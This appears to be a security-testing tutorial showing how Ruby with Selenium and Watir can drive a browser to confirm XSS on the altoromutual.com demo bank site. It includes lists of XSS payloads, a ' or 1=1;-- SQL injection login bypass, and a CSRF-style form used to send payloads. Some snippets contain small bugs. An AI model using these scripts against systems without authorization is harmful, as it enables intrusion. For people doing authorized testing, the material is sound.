# Browser Manipulation 
As a hacker, sometimes you need to automate your client side tests (ex. XSS) and reduce the false positives that happen specially in XSS tests. The traditional automation depends on finding the sent payload been received in the response, but it doesn't mean the vulnerability get really exploited so you have to do it manually again and again.

Here we'll learn to make ruby control our browser in order to **emulate** the same attacks from browser and get the real results.

The most known APIs for this task are ***Selenium*** and ***Watir*** which support most know web browsers currently exist.

## Selenium Webdriver
[**Selenium**](https://github.com/seleniumhq/selenium) is an umbrella project encapsulating a variety of tools and libraries enabling web browser automation.

- To install selenium gem
```
gem install selenium-webdriver
```


### GET Request 
```ruby
#!/usr/bin/env ruby
#
#
require "selenium-webdriver"

# Profile Setup and Tweak 
proxy = Selenium::WebDriver::Proxy.newproxy = Selenium::WebDriver::Proxy.new(
  :http     => PROXY,
  :ftp      => PROXY,
  :ssl      => PROXY
)       # Set Proxy hostname and port 
profile = Selenium::WebDriver::Firefox::Profile.from_name "default"     # Use an existing profile name 
profile['general.useragent.override'] = "Mozilla/5.0 (compatible; MSIE 9.0; " + 
                                        "Windows Phone OS 7.5; Trident/5.0; " + 
					                    "IEMobile/9.0)"                 # Set User Agentprofile.proxy = proxy                                                   # Set Proxy
profile.assume_untrusted_certificate_issuer = false                     # Accept untrusted SSL certificates 

# Start Driver 
driver = Selenium::WebDriver.for(:firefox, :profile => profile)         # Start firefox driver with specified profile
# driver = Selenium::WebDriver.for(:firefox, :profile => "default")     # Use this line if just need a current profile and no need to setup or tweak your profile
driver.manage.window.resize_to(500, 400)                                # Set Browser windows size
driver.navigate.to "http://www.altoromutual.com/search.aspx?"           # The URL to navigate 

# Interact with elements
element = driver.find_element(:name, 'txtSearch')   # Find an element named 'txtSearch'
element.send_keys "<img src=x onerror='alert(1)'>"  # Send your keys to element
element.send_keys(:control, 't')                    # Open a new tab
element.submit                                      # Submit the text you've just sent
```


> Note that the actual keys to send depend on your OS, for example, Mac uses `COMMAND + t`, instead of `CONTROL + t`.


### POST Request 
```ruby
#!/usr/bin/env ruby
#
#
require 'selenium-webdriver'

browser = Selenium::WebDriver.for :firefox
browser.get "http://www.altoromutual.com/bank/login.aspx"

wait = Selenium::WebDriver::Wait.new(:timeout => 15)		# Set waiting timeout
# Find the input elements to interact with later.
input = wait.until {
  element_user = browser.find_element(:name, "uid")
  element_pass = browser.find_element(:name, "passw")
  # Retrun array of elements when get displayed
  [element_user, element_pass] if element_user.displayed? and element_pass.displayed?
}

input[0].send_keys("' or 1=1;--")   # Send key for the 1st element 
input[1].send_keys("password")      # Send key fro the next element
sleep 1

# Click/submit the button based the form it is in (you can also call 'btnSubmit' method)
submit = browser.find_element(:name, "btnSubmit").click #.submit

# browser.quit
```


Let's test the page against XSS vulnerability. First I'll list what kind of action we need from browser

1. Open a browser window (Firefox)
2. Navigate to a URL (altoromutual.com)
3. Perform some operations (Send an XSS payload)
4. Check if the payload is working(Popping-up) or it's a false positive 
5. Print the succeed payloads on terminal

**selenium-xss.rb**
```ruby
#!/usr/bin/env ruby
#
#
require 'selenium-webdriver'

payloads = 
  [ 
    "<video src=x onerror=alert(1);>",
    "<img src=x onerror='alert(2)'>",
    "<script>alert(3)</script>",
    "<svg/OnlOad=prompt(4)>",
    "javascript:alert(5)",
    "alert(/6/.source)"
  ]

browser = Selenium::WebDriver.for :firefox
browser.manage.window.resize_to(500, 400)
browser.get "http://www.altoromutual.com/search.aspx?"

wait = Selenium::WebDriver::Wait.new(:timeout => 20)

payloads.each do |payload|
  input = wait.until do
      element = browser.find_element(:name, 'txtSearch')
      element if element.displayed?
  end
  input.send_keys(payload)
  input.submit
  
  begin 
    wait.until do 
      txt = browser.switch_to.alert
      if (1..100) === txt.text.to_i
	    puts "Payload is working: #{payload}"
	    txt.accept 
      end
    end
  rescue Selenium::WebDriver::Error::NoAlertOpenError
    puts "False Positive: #{payload}"
    next
  end
  
end

browser.close
```

Result
```
> ruby selenium-xss.rb
Payload is working: <video src=x onerror=alert(1);>
Payload is working: <img src=x onerror='alert(2)'>
Payload is working: <script>alert(3)</script>
Payload is working: <svg/OnlOad=prompt(4)>
False Positive: javascript:alert(5)
False Positive: alert(/6/.source)
```



## Watir Webdriver
[**Watir**](http://watirwebdriver.com/) is abbreviation for (Web Application Testing in Ruby). I believe that Watir is more elegant than Selenium but I like to know many ways to do the same thing, just in case. 

- To install watir gem
```
gem install watir-webdriver
```


### GET Request 

```ruby
#!/usr/bin/env ruby
#
#
require 'watir-webdriver'

browser = Watir::Browser.new :firefox
browser.goto "http://www.altoromutual.com/search.aspx?"
browser.text_field(name: 'txtSearch').set("<img src=x onerror='alert(1)'>")
btn = browser.button(value: 'Go')
puts btn.exists?
btn.click

# browser.close
```

Sometime you'll need to send XSS GET request from URL like `http://app/search?q=<script>alert</script>`. You'll face a known error `Selenium::WebDriver::Error::UnhandledAlertError: Unexpected modal dialog` if the alert box popped up but it you do refresh page for the sent payload it'll work so the fix for this issue is the following

```ruby
#!/usr/bin/env ruby
#
#
require 'watir-webdriver'

browser = Watir::Browser.new :firefox
begin 
    browser.goto("http://www.altoromutual.com/search.aspx?txtSearch=<img src=x onerror=alert(1)>")
rescue Selenium::WebDriver::Error::UnhandledAlertError
    browser.refresh
    wait.until {browser.alert.exists?}
end

if @browser.alert.exists? 
    @browser.alert.ok
    puts "[+] Exploit found!
    browser.close
end
```

### POST Request 

```ruby
#!/usr/bin/env ruby
#
#
require 'watir-webdriver'

browser = Watir::Browser.new :firefox
browser.window.resize_to(800, 600)
browser.window.move_to(0, 0)
browser.goto "http://www.altoromutual.com/bank/login.aspx"
browser.text_field(name: 'uid').set("' or 1=1;-- ")
browser.text_field(name: 'passw').set("password")
btn = browser.button(name: 'btnSubmit').click 

# browser.close
```

> - Since Waiter is integrated with Selenium, you can use both to achieve one goal 
> - For Some reason in some log-in cases, you may need to add a delay time between entering username and password then submit.



## Selenium, Watir Arbitrary POST request
Here another scenario I've faced, I was against POST request without submit button, in another word, the test was against intercepted request generated from jquery function, in my case was a drop menu. So The work round wad quite simple, Just create an HTML file contains POST form with the original parameters plus a **Submit button**(***just like creating CSRF exploit from a POST form***) then call that html file to the browser and deal with it as normal form. Let's to see an example here.

**POST request**
```
POST /path/of/editfunction HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 100
Cookie: PHPSESSIONID=111111111111111111111
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

field1=""&field2=""&field3=""&field4=""
```

**example.html**
```html
<html>
  <head>
    <title>Victim Site - POST request</title>
  </head>
  <body>
    <form action="https://example.com/path/of/editfunction" method="POST">
      <input type="text" name="field1" value="" />
      <input type="text" name="field2" value="" />
      <input type="text" name="field3" value="" />
      <input type="text" name="field4" value="" />
      <p><input type="submit" value="Send" /></p>
    </form>
  </body>
</html>
```

**exploit.rb**
```ruby
#!/usr/bin/env ruby
#
#
require 'watir-webdriver'

@browser = Watir::Browser.new :firefox
@browser.window.resize_to(800, 600)
@browser.window.move_to(400, 300)

def sendpost(payload)
  @browser.goto "file:///home/KING/Code/example.html"

  @browser.text_field(name: 'field1').set(payload)
  @browser.text_field(name: 'field2').set(payload)
  @browser.text_field(name: 'field3').set(payload)
  @browser.text_field(name: 'field4').set(payload)
  sleep 0.1
  @browser.button(value: 'Send').click
end

payloads = 
    [
      '"><script>alert(1)</script>',
      '<img src=x onerror=alert(2)>'
    ]

puts "[*] Exploitation start"
puts "[*] Number of payloads: #{payloads.size} payloads" 
payloads.each do |payload|
  print "\r[*] Trying: #{payload}"
  print "\e[K"
  sendpost payload
  
  if @browser.alert.exists?
    @browser.alert.ok
    puts "[+] Exploit found!: " + payload
    @browser.close
  end 
end
```



<br><br><br>
---
- [Selenium official documentations](http://docs.seleniumhq.org/docs/)
- [Selenium Cheat Sheet](https://gist.github.com/kenrett/7553278) 
- [Selenium webdriver vs Watir-webdriver in Ruby](http://watirmelon.com/2011/05/05/selenium-webdriver-vs-watir-webdriver-in-ruby/)
- [Writing automate test scripts in Ruby](https://www.browserstack.com/automate/ruby)
- [Selenium WebDriver and Ruby](https://swdandruby.wordpress.com/)
- [The Selenium Guidebook - Commercial ](https://seleniumguidebook.com/)
- [Watir WebDriver](http://watirwebdriver.com/)
- [Watir Cheat Sheet](https://github.com/watir/watir/wiki/Cheat-Sheet)